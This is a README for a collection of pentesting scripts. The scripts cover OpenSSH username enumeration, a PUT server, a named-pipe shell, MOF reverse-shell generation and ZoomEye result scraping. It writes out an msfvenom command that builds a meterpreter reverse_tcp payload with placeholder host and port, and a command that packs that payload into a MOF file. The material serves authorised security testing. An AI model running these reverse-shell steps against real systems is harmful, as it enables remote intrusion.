A collection of some useful script for pentesters or red teamers


## [sshUsernameEnumExploit.py](https://github.com/Malayke/Scripts/tree/master/CVE-2018-15473-sshUsernameEnumExploit)

OpenSSH < 7.7 username enumeration exploit  
OpenSSH 版本小于7.7 用户名枚举漏洞利用工具 

## HTTPPutServer.py

A simple HTTP PUT Server write by python  

用 Python 写的 HTTP PUT Server

## web-rce-named-pipe-shell.py

A named pipe tty shell via mkfifo.

## generate-mof-reverse-shell-file.py

This python script can generate a MOF reverse shell file.

First step, generate vbs reverse shell shellcode via `msfvenom`

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e generic/none -f vbs -o reverse_shell.vbs
```

then generate MOF file: 

```
$ python3 generate-mof-reverse-shell-file.py reverse_shell.vbs > reverse_shell.mof
```
## mitmproxy-zoomeye.py

Mitmproxy zoomeye proxy, grab zoomeye search hosts to file
> before start import `~/.mitmproxy/mitmproxy-ca-cert.pem` to firefox
1. start mitmproxy
```shell
$ mitmdump -s zoomeye.py "~d zoomeye.org & '/search'"
```
2. set browser proxy with mitmproxy address
3. searching on zoomeye, result will be save in result.txt
